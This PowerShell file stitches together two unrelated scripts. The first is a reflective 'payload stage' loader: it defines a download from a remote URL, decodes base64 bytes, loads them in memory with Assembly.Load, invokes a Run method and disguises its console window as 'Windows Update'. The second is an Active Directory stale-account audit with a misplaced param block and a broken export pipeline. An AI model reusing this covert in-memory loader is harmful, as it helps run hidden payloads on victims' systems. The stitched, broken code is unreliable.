<#
.SYNOPSIS
    Managed assembly acquisition and reflection workflow.

.DESCRIPTION
    Downloads or decodes a managed payload stage, loads it into the
    current AppDomain, then looks for a conventional entry method
    and invokes it only when present.

.NOTES
    The loader expects a managed payload stage.
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://adatum.com:8443/payload.bin',
    [string]$LogPath = "$env:TEMP\stage.log",
    [int]$TimeoutSec = 31
)
$ErrorActionPreference = "Stop"

# Acquisition
function Get-StageAssemblyBytes {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [int]$TimeoutSec = 31
    )

    Write-Verbose ("Downloading assembly bytes from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadData($SourceUrl)
}

# Reflection
function Invoke-AssemblyEntryPoint {
    [CmdletBinding()]
    param(
        [object]$LoadedAssembly = $null
    )

    if ($null -eq $LoadedAssembly) {
        throw "Loaded assembly is null"
    }
    $Types = $LoadedAssembly.GetTypes()
    if ($Types.Length -gt 0) {
        $EntryMethod = $Types[0].GetMethod("Run")
        if ($null -ne $EntryMethod) {
            Write-Verbose "Invoking entry method"
            return $EntryMethod.Invoke($null, @())
        }
    }
    Write-Verbose "No conventional entry method found"
    return $null
}

try {
    Write-Verbose "Starting managed loader"
    $AssemblyBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjptdm5janF3eG55')
    Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
    $ResultObject = [Reflection.Assembly]::Load($AssemblyBytes)
    $EntryResult = Invoke-AssemblyEntryPoint -LoadedAssembly $ResultObject
    Write-Verbose ("Entry result: " + $EntryResult)
}
catch {
    Write-Warning "Managed loader failed: $($_.Exception.Message)"
}

$AssemblyReport = [ordered]@{
    Stage = "reflection"
    ByteCount = $AssemblyBytes.Length
    Endpoint = $PayloadUrl
}
$AssemblyReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Operation completed"
Write-Verbose "Preparing working directory"
Write-Verbose "Collecting host metadata"
Write-Verbose "Resolving configured target"
Write-Verbose "Applying operation timeout"
Write-Verbose "Exporting operation report"
Write-Verbose "Retry budget remaining"
Write-Verbose "Reading configuration values"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
$Host.UI.RawUI.WindowTitle = "Windows Update"
Start-Sleep -Seconds 29
[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [Alias('DnsDomain')]
    [string]$Domain = "adatum.com",
    [string]$SearchBase = 'OU=Contractors,DC=adatum,DC=com',
    [string]$ReportPath = "C:\Logs\reports\ad-user-audit-2024-12-10.csv",

    [string]$HtmlPath = 'C:\Logs\reports\ad-user-audit-2024-12-10.html',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$InactiveDays = 90,
    [int]$PasswordMaxAge = 90,

    [string]$SmtpServer = "smtp.adatum.com"
)

$ErrorActionPreference = 'Stop'
Set-StrictMode -Version 2.0
$InformationPreference = 'SilentlyContinue'

Import-Module ActiveDirectory -ErrorAction Stop

Import-Module ActiveDirectory -ErrorAction Stop
$cutoff = (Get-Date).AddDays(-$InactiveDays)
$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$users = Get-ADUser -Filter * -SearchBase $SearchBase -Properties $properties

$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}
$pwdCutoff = (Get-Date).AddDays(-$PasswordMaxAge)
$oldPasswords = $users | Where-Object {
    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt $pwdCutoff
}

$staleCount = @($stale).Count
$disabledCount = @($users | Where-Object { $_.Enabled -eq $false }).Count
$oldPwdCount = @($oldPasswords).Count

$stale | Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet |
    -NoTypeInformation `
    -Path $ReportPath `
    -Encoding UTF8

$oldPasswords | Select-Object Name, SamAccountName, PasswordLastSet | Export-Csv -Path $ReportPath.Replace('.csv', '-passwords.csv') -NoTypeInformation

Write-Host ("Stale: {0} | Disabled: {1} | Old passwords: {2}" -f $staleCount, $disabledCount, $oldPwdCount) -ForegroundColor Cyan
Write-Verbose ("Report written to {0}" -f $ReportPath)
